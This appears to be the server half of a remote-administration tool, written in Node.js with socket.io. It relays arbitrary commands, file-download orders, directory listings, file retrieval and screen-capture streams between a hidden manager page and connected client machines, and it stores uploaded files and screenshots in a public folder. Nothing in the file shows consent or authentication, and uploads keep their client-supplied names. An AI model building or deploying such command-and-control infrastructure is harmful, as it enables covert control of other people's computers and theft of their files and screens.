const express = require('express');
const port = process.env.PORT || 3000;
var app = new express();
var bodyParser = require('body-parser');

var multer = require('multer')

var app = express();
var upload = multer({ dest: 'public/uploads/' })

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
var http = require("http").Server(app);
var io = require("socket.io")(http);
app.use(express.static(__dirname + "/public"));
app.get('/d03e04fc-9775-4ed3-9e66-15671b3a8df5', function (req, res) {
    res.redirect('manager.html');
});
app.get('/', function (req, res) {
    res.redirect('index.html');
});
var fs = require('fs');
var adminSocketID;

io.on('connection', async function (socket) {
    var sId = socket.id;
    console.log('Client ' + sId.toString() + ' connected')
    socket.broadcast.emit('oneConnect', sId);
    socket.on('callServer', async function () {
        await socket.broadcast.emit('callClient');
    });
    socket.on('browserReply', async function (data) {
        adminSocketID = socket.id;
        await socket.broadcast.emit('server', 'ON');
    });
    socket.on('reject', async function (id) {
        try {
            console.log('diss')
            await socket.to(id).emit('ej', 'offf');
        } catch (error) {
            console.log('ok')
        }
    });
    socket.on('deleteLog', async function () {
        try {
            fs.open('./public/logEr.txt', 'w', function (err, file) {
                if (err) throw err;
                console.log('File renew');
            });

        } catch (error) {

        }
    });
    socket.on('Error', async function (data) {
        fs.appendFile('./public/logEr.txt', data + '\n', function (err) {
            if (err) throw err;
        });
        await socket.broadcast.emit('showErr', [data, sId]);
    });
    socket.on('stream', async function (data) {
        var id_img = [socket.id, data]
        await socket.broadcast.emit('stream', id_img);
    });
    socket.on('disconnect', async function () {
        if (socket.id == adminSocketID) {
            await socket.broadcast.emit('adminleft', 'Admin leave');
        }
        else {
            await socket.broadcast.emit('oneLeft', socket.id);
        }
    });

    socket.on('downspeed', async function (id) {
        console.log(id);
        await socket.to(id).emit('downspeed', 'Speed down');
    });
    socket.on('Logoff', async function (id) {
        await socket.to(id).emit('logoff', 'Off');
    });
    socket.on('Login', async function (id) {
        await socket.to(id).emit('login', 'Off');
    });
    socket.on('command', async function (cmd_id) {
        // Format : command|time
        var cmd = cmd_id[0];
        var id = cmd_id[1];

        console.log(cmd);
        console.log(id);
        await socket.to(id).emit('command', cmd);
    });
    socket.on('sendFile', async function (plug_id) {
        // Format : Url|name to save
        var plug = plug_id[0];
        var id = plug_id[1];
        await socket.to(id).emit('sendFile', plug);
    });
    socket.on('upspeed', async function (id) {
        console.log(id);
        await socket.to(id).emit('upspeed', 'Speed up');
    });
    socket.on('getDir', async function (id_dir) {
        // await socket.broadcast.emit(id_dir[0], id_dir[1]);
        console.log(id_dir[1])
        await socket.broadcast.emit('listDir', id_dir[1]);
    });
    socket.on('getFile', async function (id_dir) {
        await socket.broadcast.emit('getFile', id_dir[1]);
    });

    socket.on('sendFileOK', async function (messages) {
        var id = socket.id;

        await socket.broadcast.emit('getFileMessages',[id,messages]);
    });

    socket.on('resDir', async function (list) {
        var id = socket.id;
        console.log(list);
        socket.broadcast.emit('dirlist', [id, list]);
    });
    socket.on('resDirEr', async function (mess) {

    });
});
app.post('/', (req, res) => {
    var data = req.body.img;
    imgbase64 = data.substr(2, data.length - 3);
    fs.writeFile('./public/client.txt', imgbase64,//'base64',
        function (err, data) {
            if (err) {
                console.log(err);
            }
        });
    console.log('Recv')
    res.send('ok')
})
app.post('/file', upload.array('file'), function (req, res, next) {
    var data = JSON.parse(JSON.stringify(req.files))
    var path = data[0].path;
    var origi = data[0].originalname;
    var des = data[0].destination;
    fs.rename(path, des+origi, function (err) {
        if (err) console.log('ERROR: ' + err);
    });
    res.send('ok')
})
app.get('/file', (req, res) => {

    fs.readdir('./public/uploads/', function (err, files) {
        //handling error
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        } 
        //listing all files using forEach
        files.forEach(function (file) {
            // Do whatever you want to do with the file
            console.log(file); 
        });
    });
    res.send('ok');
});


http.listen(port, function () {
    console.log("Server running at port " + port);
});